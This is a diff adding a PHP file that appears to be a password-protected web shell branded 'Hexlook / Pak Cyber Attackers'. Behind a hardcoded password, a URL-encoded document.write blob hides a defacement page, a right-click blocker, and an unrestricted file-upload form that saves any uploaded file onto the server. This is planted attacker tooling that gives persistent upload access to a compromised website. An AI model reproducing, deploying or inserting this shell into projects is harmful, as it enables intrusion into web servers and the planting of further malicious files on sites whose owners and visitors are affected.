@@ -1,0 +1,48 @@
+<?php 
+$Password = 'pca$hex'; // hexlook
+
+if (isset($_POST['submit_pwd'])){ 
+   $pass = isset($_POST['passwd']) ? $_POST['passwd'] : ''; 
+      
+   if ($pass != $Password) { 
+      showForm("Wrong password"); 
+      exit();      
+   } 
+} else { 
+   showForm(); 
+   exit(); 
+} 
+?>
+
+
+<?php 
+function showForm($error="LOGIN"){ 
+?> 
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 
+                      "DTD/xhtml1-transitional.dtd"> 
+<html> 
+<body> 
+  <?php echo $error; ?> 
+  <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" name="pwd"> 
+    Password: 
+     <table> 
+       <tr> 
+         <td><input name="passwd" type="password"/></td> 
+       </tr> 
+       <tr> 
+         <td align="center"><br/> 
+          <input type="submit" name="submit_pwd" value="Login"/> 
+         </td> 
+       </tr> 
+     </table>   
+   </form> 
+</body>        
+<?php    
+} 
+?>
+
+<script>
+<!--
+document.write(unescape("%0A%0A%3Chead%3E%3Ctitle%3EHexlook%20PakCyberAttackers%3C/title%3E%0A%3Cbody%20bgcolor%3D%22black%22%3E%0A%3Cstyle%3E%0A%3C%21--%0Ap%20%7BMARGIN-TOP%3A%200px%3B%20MARGIN-BOTTOM%3A%200px%3B%20LINE-HEIGHT%3A%20150%25%7D--%3E%0A%3C/style%3E%0A%3C/head%3E%0A%0A%3Ctable%20style%3D%22BORDER-COLLAPSE%3A%20collapse%22%20cellspacing%3D%220%22%20bordercolordark%3D%22%23666666%22%20cellpadding%3D%226%22%20height%3D%221%22%20width%3D%22100%25%22%20bgcolor%3D%22%23000000%22%20bordercolorlight%3D%22%23c0c0c0%22%20border%3D%221%22%3E%0A%20%20%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20bookmark%3D%22minipanel%22%20style%3D%22font-weight%3A%20normal%3B%20color%3A%20%23009900%3B%20font-family%3A%20verdana%3B%20text-decoration%3A%20none%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%20width%3D%2250%25%22%20height%3D%221%22%20valign%3D%22top%22%20style%3D%22font-family%3A%20verdana%3B%20color%3A%20%23d9d9d9%3B%20font-size%3A%2011px%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ccenter%3E%3Cfont%20color%3D%22lime%22%3E%3Cb%3E%3Cblink%3EUpload%3C/blink%3E%3C/b%3E%3C/font%3E%3Cform%20method%3D%22POST%22%20enctype%3D%22multipart/form-data%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22hidden%22%20name%3D%22act%22%20value%3D%22upload%22%20style%3D%22font-size%3A%209pt%3B%20color%3A%20%23FFFFFF%3B%20font-family%3A%20Tahoma%3B%20border%3A%201%20solid%20%23666666%3B%20background-color%3A%20%23009900%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22file%22%20name%3D%22userfile%22%20style%3D%22font-size%3A%209pt%3B%20color%3A%20%23FFFFFF%3B%20font-family%3A%20Tahoma%3B%20border%3A%201%20solid%20%23666666%3B%20background-color%3A%20%23009900%22%3E%3Cinput%20type%3D%22hidden%22%20name%3D%22miniform%22%20value%3D%221%22%20style%3D%22font-size%3A%208pt%3B%20color%3A%20%23FFFFFF%3B%20font-family%3A%20Tahoma%3B%20border%3A%201%20solid%20%23666666%3B%20background-color%3A%20%23009900%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22submit%22%20name%3D%22submit%22%20value%3D%22Upload%22%20style%3D%22font-size%3A%208pt%3B%20color%3A%20%23FFFFFF%3B%20font-family%3A%20Tahoma%3B%20border%3A%201%20solid%20%23666666%3B%20background-color%3A%20%23009900%22%3E%3Cbr%3E%3Cbr%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%3Fphp%0A%24uploaddir%20%3D%20%22%22%3B%0A%24uploadfile%20%3D%20%24uploaddir%20.%20basename%28%24_FILES%5B%27userfile%27%5D%5B%27name%27%5D%29%3B%0A%20%0Aif%20%28isset%28%24_FILES%5B%27userfile%27%5D%5B%27name%27%5D%29%29%20%7B%0A%20%20%20%20%20%20%20%20if%20%28move_uploaded_file%28%24_FILES%5B%27userfile%27%5D%5B%27tmp_name%27%5D%2C%20%24uploadfile%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20echo%20%22The%20file%20%22.%20basename%28%24_FILES%5B%27userfile%27%5D%5B%27name%27%5D%29%20.%22%20has%20been%20uploaded%22%3B%0A%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20echo%20%22There%20was%20an%20error%20uploading%20the%20file.%20please%20try%20again%21%22%3B%0A%20%20%20%20%20%20%20%20%7D%0A%7D%0A%3F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/form%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/center%3E%3C/td%3E%0A%20%20%20%20%20%20%20%20%3C/tr%3E%0A%3C/table%3E%0A%0A%3Cscript%20type%3D%22text/javascript%22%3E%0A%0A%3C%21--%0A%0A//Disable%20right%20click%20script%0A%0A//visit%20http%3A//www.rainbow.arch.scriptmania.com/scripts/%0A%0Avar%20message%3D%22Sorry%2C%20right-click%20has%20been%20disabled%22%3B%0A%0A///////////////////////////////////%0A%0Afunction%20clickIE%28%29%20%7Bif%20%28document.all%29%20%7B%28message%29%3Breturn%20false%3B%7D%7D%0A%0Afunction%20clickNS%28e%29%20%7Bif%0A%0A%28document.layers%7C%7C%28document.getElementById%26%26%21document.all%29%29%20%7B%0A%0Aif%20%28e.which%3D%3D2%7C%7Ce.which%3D%3D3%29%20%7B%28message%29%3Breturn%20false%3B%7D%7D%7D%0A%0Aif%20%28document.layers%29%0A%0A%7Bdocument.captureEvents%28Event.MOUSEDOWN%29%3Bdocument.onmousedown%3DclickNS%3B%7D%0A%0Aelse%7Bdocument.onmouseup%3DclickNS%3Bdocument.oncontextmenu%3DclickIE%3B%7D%0A%0Adocument.oncontextmenu%3Dnew%20Function%28%22return%20false%22%29%0A%0A//%20--%3E%0A%0A%3C/script%3E%0A%0A%3Cbr%3E%0A%3C/a%3E%3Cp%20align%3D%22center%22%3E%3Cfont%20size%3D%2235%22%3E%3Cb%3E%3Cfont%20color%3D%22white%22%3EPakis%3C/font%3E%3Cfont%20color%3D%22lime%22%3Etan%3C/font%3E%3Cfont%20color%3D%22lime%22%3EZindabad%3C/font%3E%3C/b%3E%3C/font%3E%3C/p%3E%09%09%0A%3Cbr%3E%0A%3Cdiv%20id%3D%22court_not_in_session%22%20style%3D%22text-align%3A%20center%3B%20font-family%3A%27BebasNeueRegular%27%2C%20Arial%2C%20Helvetica%2C%20sans-serif%3B%20text-shadow%3A0%200%205px%20%2300c6ff%3B%22%3E%0A%3Cimg%20src%3D%22http%3A//i58.tinypic.com/3163qyr.gif%22%20style%3D%22height%3A%2063px%3B%20width%3A%2082px%3B%22%20align%3D%22center%22/%3E%0A%3Cspan%20id%3D%22not_in_session%22%20style%3D%22font-size%3A%2058px%3B%22%3ETeam%3A%20Pak%20Cyber%20Attackers%3C/span%3E%0A%3Cimg%20src%3D%22http%3A//i58.tinypic.com/3163qyr.gif%3E%22%20style%3D%22height%3A%2063px%3B%20width%3A%2082px%3B%22%20align%3D%22center%22/%3E%3C/div%3E%0A%3Cbr%3E%0A%3Cp%3E%3Ccenter%3E%3Cimg%20src%3D%22http%3A//i58.tinypic.com/103y0cn.gif%22%20alt%3D%22Hexlook%22%20height%3D%2273%22width%3D%2292%22%3E%3C/center%3E%3C/p%3E%0A%3Ccenter%3E%3Cfont%20color%3D%22lime%22%20size%3D%225%22%3EH%20E%20X%20L%20O%20O%20K%3C/center%3E%0A%3Cbr%3E%0A%0A%0A"));
+//-->
+</script>
